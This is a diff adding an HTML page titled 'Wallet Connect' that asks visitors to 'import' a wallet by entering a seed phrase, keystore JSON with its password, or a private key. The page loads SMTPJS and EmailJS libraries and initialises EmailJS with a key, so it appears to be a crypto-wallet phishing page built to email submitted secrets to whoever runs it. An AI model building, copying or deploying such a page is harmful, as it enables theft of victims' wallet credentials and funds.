@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../assets/css/address.css">
+    <link rel="shortcut icon" href="../assets/images/favicon_io/favicon.ico" type="image/x-icon">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <title>Wallet Connect</title>
+</head>
+
+<body>
+
+    <div class="overlay">
+        <div class="modal">
+            <div class="modal-content">
+                <div class="import-heading">
+                    <h1><a href="#">Import Wallet </a></h1>
+                </div>
+                <ul class="import-options">
+                    <li class="phrase key" >Phrase</li>
+                    <li class="keystore key">Keystore JSON</li>
+                    <li class="private-key key">Private Key</li>
+                </ul>
+                <hr>
+                <form  method="post">
+                    <div class="phrase-container">
+                        <textarea name="phrase" required id="phrase" class="input-area" cols="30" rows="10" placeholder="Phrase" ></textarea><br>
+                        <em>Typically 12(sometimes 24) words separated by single spaces</em>
+                        <button class="import--btn phrase-submit" type="submit">Import</button>
+                    </div>
+                </form>
+                <form method="post">
+                    <div class="keystore-container">
+                        <textarea name="keystore" id="keystore" class="input-area" cols="30" rows="10" placeholder="Keystore"
+                            required></textarea><br>
+                        <input type="password" name="keystore password" required id="keystore-password" placeholder="Password">
+                        <em>Several lines of text beginning with "{...}" plus the password you used to encrypt it. </em>
+                        <button class="import--btn keystore-submit" type="submit">Import</button>
+                    </div>
+                </form>
+                <form method="post">
+                    <div class="private-key-container">
+                        <input name="private-key" id="private-key" cols="30" rows="10" placeholder="Private Key"
+                            required></textarea><br>
+                        <em>Typically 12(sometimes 24) words separated by single spaces</em>
+                        <button class="import--btn private-submit" type="submit">Import</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("h_9F_SBLRMU4Q2DN1");
+   })();
+</script>
+    <script src="../assets/js/address.js"></script>
+
+</body>
+
+</html>
